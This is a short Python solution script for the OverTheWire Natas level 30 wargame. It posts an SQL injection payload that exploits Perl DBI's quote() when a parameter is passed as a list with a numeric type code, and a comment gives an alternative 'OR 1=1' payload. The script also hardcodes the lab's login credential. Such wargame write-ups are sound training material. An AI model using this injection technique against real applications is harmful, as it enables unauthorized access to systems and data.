import requests
from requests.auth import HTTPBasicAuth

url = "http://natas30.natas.labs.overthewire.org/index.pl"
auth = HTTPBasicAuth("natas30", "frO4U4zCfVJXq2zG5HSVNjA46nQGzoqF")

# create a session object to maintain cookies and authentication between requests
session = requests.Session()
session.auth = auth

# quote($value, $data_type)
# $data_type is a specific hardcoded SQL type of data based on codes: SQL_CHAR / SQL_VARCHAR 1, 12
# SQL_NUMERIC 2
# if given an "integer" type of data, quote() does not sanitize the first variable anymore

# alternative solution data = {"username": ["'admin' OR 1=1 --", 2], "password": "123"}
data = {"username": "user", "password": ["'a' OR 1", 2]}

response = requests.post(url, auth=auth, data=data)

print(response.text)